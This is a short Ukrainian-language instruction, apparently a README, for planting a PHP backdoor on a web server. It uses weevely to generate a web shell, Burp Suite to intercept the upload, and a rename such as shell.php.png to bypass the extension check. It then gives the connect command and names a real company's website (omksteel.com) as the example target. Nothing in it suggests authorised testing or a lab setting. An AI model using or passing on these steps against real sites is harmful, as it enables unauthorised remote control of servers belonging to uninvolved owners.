# Інструкція

З поєднанням [Burp Suite](https://portswigger.net/burp) і [weevely](https://www.kali.org/tools/weevely/) ви можете створити бекдор у програмі PHP, наприклад [OMK's Website](https://omksteel.com/company/contacts/). Вам потрібно перехопити за допомогою [Burp Suite](https://portswigger.net/burp) коли файл завантажується, і змініть `filename`, швидше за все тому, що програма не дозволить розширення `.php` безпосередньо.

Створіть бекдор `weevely generate s3cr3t`

Знайдіть URL-адресу для завантаження файлу. У момент завантаження файлу ви можете перехопити запит і змінити завантажений файл, наприклад, `shell.png` (якщо веб-сайт дозволяє файли `.png`), до `shell.php`, який, по суті, є вашим бекдором.

Можливо, це також неможливо зробити, тоді ви можете спробувати завантажити `shell.php.png`. Деякі ідеї можна знайти тут: https://github.com/imran-parray/Web-Sec-CheatSheet/blob/master/File-Upload-test.txt

Потім підключіться до нього за допомогою `weevely https://omksteel.com/sample/url/shell.php s3cr3t`, де `s3cr3t` це пароль, який ви створили під час створення бекдора `shell.php` файл за допомогою `weevely`, або, швидше за все, щось більш витончене, подібний `weevely https://omksteel.com/sample/url/shell.php.png s3cr3t`.

Детальніше про завантаження файлів: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
